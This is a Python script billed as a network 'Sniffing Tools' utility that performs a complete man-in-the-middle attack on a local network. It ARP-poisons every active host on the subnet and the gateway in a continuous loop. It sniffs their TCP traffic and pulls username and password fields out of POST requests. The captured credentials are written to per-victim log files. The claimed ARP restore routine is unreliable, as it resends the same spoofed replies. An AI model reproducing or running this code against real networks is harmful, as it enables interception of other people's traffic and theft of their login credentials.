import os
import sys
import threading
import netifaces
import time
import platform
from colorama import init, Fore, Style
import re
import subprocess
import importlib

# Auto-install modules if not present
required_modules = {
    'scapy.all': 'scapy',
    'netifaces': 'netifaces',
    'colorama': 'colorama',
    'twisted': 'twisted==21.2.0',
    'sslstrip': 'sslstrip'
}

def install_and_import(module_name, package_name):
    try:
        importlib.import_module(module_name)
        print(f"{Fore.GREEN}[+] Module '{module_name}' is already installed.{Style.RESET_ALL}")
    except ImportError:
        print(f"{Fore.YELLOW}[!] Installing missing package: {package_name}{Style.RESET_ALL}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
        print(f"{Fore.GREEN}[+] Successfully installed '{package_name}'.{Style.RESET_ALL}")

# Install and import all required modules
for module, package in required_modules.items():
    module_base = module.split('.')[0]
    install_and_import(module_base, package)

from scapy.all import *

init(autoreset=True)

# Display Header
def display_header():
    print(Fore.GREEN + "="*60)
    print(Fore.CYAN + Style.BRIGHT + "             Sniffing Tools")
    print(Fore.YELLOW + "         Dev By Majalengka Cyber Tester")
    print(Fore.MAGENTA + "               Versi 1.0")
    print(Fore.WHITE + "  Alat untuk pemantauan dan analisis jaringan")
    print(Fore.GREEN + "="*60 + "\n")

# Display interfaces recognized by Scapy with IPs
def list_scapy_interfaces():
    interfaces = get_if_list()
    interface_info = {}
    print(Fore.CYAN + "[+] Interfaces Recognized by Scapy:")
    for idx, interface in enumerate(interfaces):
        try:
            ip_address = get_if_addr(interface)
        except:
            ip_address = '0.0.0.0'
        interface_info[interface] = ip_address
        print(Fore.YELLOW + f"    {idx + 1}. {interface} - {ip_address}")
    return interface_info

# Ping IP to verify connection
def ping_ip(ip):
    system_platform = platform.system()
    try:
        if system_platform == "Windows":
            output = subprocess.check_output(["ping", "-n", "1", "-w", "1000", ip], stderr=subprocess.DEVNULL).decode()
        else:
            output = subprocess.check_output(["ping", "-c", "1", "-W", "1", ip], stderr=subprocess.DEVNULL).decode()
        return "TTL=" in output or "ttl=" in output
    except subprocess.CalledProcessError:
        return False

# Network scanner with ping verification
def network_scanner(ip_range, local_subnet):
    print(Fore.CYAN + f"[+] Scanning network at {ip_range}...")
    answered, _ = arping(ip_range, timeout=5, verbose=False)
    devices = [{'ip': received.psrc, 'mac': received.hwsrc} for sent, received in answered]

    print(Fore.CYAN + "[+] Verifying active devices with ping...")
    active_devices = []
    for device in devices:
        if device['ip'].startswith(local_subnet):
            if ping_ip(device['ip']):
                active_devices.append(device)
                print(f"    {Fore.GREEN}Active Device Found: IP: {device['ip']}, MAC: {device['mac']}{Style.RESET_ALL}")
            else:
                print(f"    {Fore.RED}Inactive Device Skipped: IP: {device['ip']}, MAC: {device['mac']}{Style.RESET_ALL}")
        else:
            print(f"    {Fore.RED}Out of Scope Device Skipped: IP: {device['ip']}, MAC: {device['mac']}{Style.RESET_ALL}")

    if not active_devices:
        print(Fore.YELLOW + "[!] No active devices detected via ARP. Checking ARP table...")
        system_platform = platform.system()
        arp_command = "arp -a" if system_platform == "Windows" else "ip neigh"
        arp_table = subprocess.check_output(arp_command, shell=True).decode()

        for line in arp_table.splitlines():
            if system_platform == "Windows":
                match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+([a-fA-F0-9:-]{17})', line)
            else:
                match = re.match(r'(\d+\.\d+\.\d+\.\d+)\s+.*lladdr\s+([a-fA-F0-9:]{17})', line)

            if match:
                ip, mac = match.groups()
                if ip.startswith(local_subnet) and ping_ip(ip):
                    active_devices.append({'ip': ip, 'mac': mac})
                    print(f"    {Fore.GREEN}Active Device from ARP Table: IP: {ip}, MAC: {mac}{Style.RESET_ALL}")

    return active_devices

# Get MAC address
def get_mac(ip):
    arp_request = ARP(op=1, pdst=ip)
    answered, _ = sr(arp_request, timeout=5, verbose=False)
    return answered[0][1].hwsrc if answered else None

# ARP Poisoning
def arp_poison(target_ip, target_mac, source_ip, source_mac, interface):
    poison_packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(poison_packet, verbose=False, iface=interface)

# Restore ARP
def restore_arp(target_ip, target_mac, source_ip, source_mac, interface):
    restore_packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    sendp(restore_packet, count=4, verbose=False, iface=interface)

# Packet Sniffer
def packet_sniffer(interface):
    packet_filter = "tcp port 80 or tcp port 443 or tcp"
    try:
        sniff(iface=interface, prn=process_packet, store=False, filter=packet_filter)
    except Exception as e:
        print(Fore.RED + f"[!] Error during packet sniffing: {e}")

# Process packets
def process_packet(packet):
    if packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            if "POST" in payload:
                if re.search(r'username=.*?&password=.*', payload):
                    credentials = re.search(r'username=.*?&password=.*', payload).group()
                    print(Fore.RED + Style.BRIGHT + f"\n[!] Credentials Detected: {credentials}")
                    log_sensitive_data(packet, payload, credentials)
                else:
                    print(Fore.YELLOW + f"\n[!] POST Data Detected: {payload}")
                    log_sensitive_data(packet, payload)
        except UnicodeDecodeError:
            pass

# Log sensitive data
def log_sensitive_data(packet, payload, credentials=None):
    src_ip = packet[IP].src
    dst_ip = packet[IP].dst
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    log_file_path = os.path.join(log_dir, f"{src_ip}_credentials.log")
    
    with open(log_file_path, 'a', encoding='utf-8', errors='ignore') as f:
        f.write(f"\nTime: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Source IP: {src_ip}\n")
        f.write(f"Destination IP: {dst_ip}\n")
        f.write(f"Payload:\n{payload}\n")
        if credentials:
            f.write(f"Extracted Credentials: {credentials}\n")
        f.write("="*60 + "\n")
    
    print(Fore.YELLOW + f"\n[!] Data Captured from {src_ip}. Logged to {log_file_path}")

# Main execution
if __name__ == "__main__":
    display_header()
    if not os.path.exists("logs"): os.makedirs("logs")
    interfaces = list_scapy_interfaces()
    if not interfaces:
        print(Fore.RED + "[!] No interfaces recognized by Scapy."); sys.exit(0)
    
    try:
        selected_idx = int(input(Fore.CYAN + "\nSelect interface number (from Scapy list): ")) - 1
        selected_interface = list(interfaces.keys())[selected_idx]
        selected_ip = interfaces[selected_interface]
    except (ValueError, IndexError):
        print(Fore.RED + "[!] Invalid selection."); sys.exit(0)

    ip_parts = selected_ip.split('.')
    local_subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
    ip_range = f"{local_subnet}.0/24"

    devices = network_scanner(ip_range, local_subnet)
    if not devices:
        print(Fore.RED + "[!] No devices found."); sys.exit(0)

    print(Fore.GREEN + "[+] Active Devices:")
    for idx, device in enumerate(devices):
        print(f"    {idx + 1}. IP: {device['ip']}, MAC: {device['mac']}")

    GATEWAY_IP = input(Fore.CYAN + "\nEnter Gateway IP: ")
    gateway_mac = get_mac(GATEWAY_IP)
    if not gateway_mac:
        print(Fore.RED + "[!] Cannot find gateway MAC."); sys.exit(0)

    print(Fore.CYAN + "[+] Starting ARP poisoning...")
    try:
        sniff_thread = threading.Thread(target=packet_sniffer, args=(selected_interface,))
        sniff_thread.daemon = True
        sniff_thread.start()

        while True:
            for device in devices:
                if device['ip'] != GATEWAY_IP:
                    arp_poison(device['ip'], device['mac'], GATEWAY_IP, get_if_hwaddr(selected_interface), selected_interface)
                    arp_poison(GATEWAY_IP, gateway_mac, device['ip'], get_if_hwaddr(selected_interface), selected_interface)
                    print(Fore.CYAN + f"\r[+] Poisoning {device['ip']} - {device['mac']}   ", end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.GREEN + "\n[+] Stopping ARP poisoning and restoring ARP tables...")
        for device in devices:
            restore_arp(device['ip'], device['mac'], GATEWAY_IP, gateway_mac, selected_interface)
            restore_arp(GATEWAY_IP, gateway_mac, device['ip'], device['mac'], selected_interface)
        sys.exit(0)
